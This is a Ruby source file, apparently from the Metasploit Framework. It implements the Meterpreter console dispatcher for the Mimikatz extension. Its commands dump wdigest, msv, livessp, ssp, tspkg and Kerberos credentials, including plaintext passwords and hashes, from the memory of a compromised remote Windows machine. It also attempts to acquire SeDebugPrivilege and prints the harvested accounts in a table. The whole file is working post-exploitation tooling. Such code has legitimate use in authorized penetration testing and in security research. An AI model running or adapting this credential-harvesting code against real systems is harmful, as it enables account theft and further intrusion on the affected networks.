# -*- coding: binary -*-
require 'rex/post/meterpreter'

module Rex
module Post
module Meterpreter
module Ui

###
#
# Mimikatz extension - grabs credentials from windows memory (older OSes).
#
# Benjamin DELPY `gentilkiwi`
# http://blog.gentilkiwi.com/mimikatz
#
# extension converted by Ben Campbell (Meatballs)
#
###
class Console::CommandDispatcher::Mimikatz

  Klass = Console::CommandDispatcher::Mimikatz

  include Console::CommandDispatcher

  #
  # Name for this dispatcher
  #
  def name
    'Mimikatz'
  end

  #
  # Initializes an instance of the priv command interaction.
  #
  def initialize(shell)
    super

    si = client.sys.config.sysinfo
    if client.arch == ARCH_X86 && si['Architecture'] == ARCH_X64
      print_warning('Loaded x86 Mimikatz on an x64 architecture.')
      print_line
    end

    unless si['OS'] =~ /Windows (NT|XP|2000|2003|\.NET)/i
      print_warning("Loaded Mimikatz on a newer OS (#{si['OS']}). Did you mean to 'load kiwi' instead?")
    end
  end

  #
  # List of supported commands.
  #
  def commands
    {
      'mimikatz_command' => 'Run a custom command.',
      'wdigest'          => 'Attempt to retrieve wdigest creds.',
      'msv'              => 'Attempt to retrieve msv creds (hashes).',
      'livessp'          => 'Attempt to retrieve livessp creds.',
      'ssp'              => 'Attempt to retrieve ssp creds.',
      'tspkg'            => 'Attempt to retrieve tspkg creds.',
      'kerberos'         => 'Attempt to retrieve kerberos creds.'
    }
  end

  @@command_opts = Rex::Parser::Arguments.new(
    '-f' => [true,  'The function to pass to the command.'],
    '-a' => [true,  'The arguments to pass to the command.'],
    '-h' => [false, 'Help menu.']
  )

  def cmd_mimikatz_command(*args)
    if (args.length == 0)
      args.unshift('-h')
    end

    cmd_args = nil
    cmd_func = nil
    arguments = []

    @@command_opts.parse(args) { |opt, idx, val|
      case opt
        when '-a'
          cmd_args = val
        when '-f'
          cmd_func = val
        when '-h'
          print_line('Usage: mimikatz_command -f func -a args')
          print_line
          print_line('Executes a mimikatz command on the remote machine.')
          print_line('e.g. mimikatz_command -f sekurlsa::wdigest -a full')
          print_line(@@command_opts.usage)
          return true
      end
    }

    unless cmd_func
      print_error('You must specify a function with -f')
      return true
    end

    if cmd_args
      arguments = cmd_args.split(' ')
    end

    print_line(client.mimikatz.send_custom_command(cmd_func, arguments))
  end

  def mimikatz_request(provider, method)
    get_privs
    print_status("Retrieving #{provider} credentials")
    accounts = method.call

    table = Rex::Text::Table.new(
      'Header'    => "#{provider} credentials",
      'Indent'    => 0,
      'SortIndex' => 4,
      'Columns'   => ['AuthID', 'Package', 'Domain', 'User', 'Password']
    )

    accounts.each do |acc|
      table << [acc[:authid], acc[:package], acc[:domain], acc[:user], (acc[:password] || '').gsub("\n", '')]
    end

    print_line table.to_s

    return true
  end

  def cmd_wdigest(*args)
    method = Proc.new { client.mimikatz.wdigest }
    mimikatz_request('wdigest', method)
  end

  def cmd_msv(*args)
    method = Proc.new { client.mimikatz.msv }
    mimikatz_request('msv', method)
  end

  def cmd_livessp(*args)
    method = Proc.new { client.mimikatz.livessp }
    mimikatz_request('livessp', method)
  end

  def cmd_ssp(*args)
    method = Proc.new { client.mimikatz.ssp }
    mimikatz_request('ssp', method)
  end

  def cmd_tspkg(*args)
    method = Proc.new { client.mimikatz.tspkg }
    mimikatz_request('tspkg', method)
  end

  def cmd_kerberos(*args)
    method = Proc.new { client.mimikatz.kerberos }
    mimikatz_request('kerberos', method)
  end

  def get_privs
    if client.sys.config.is_system?
      print_good('Running as SYSTEM')
    else
      print_warning('Not currently running as SYSTEM')
      print_status('Attempting to getprivs ...')
      privs = client.sys.config.getprivs

      if privs.include?('SeDebugPrivilege')
        print_good('Got SeDebugPrivilege.')
      else
        print_warning('Unable to get SeDebugPrivilege.')
      end
    end
  end
end

end
end
end
end

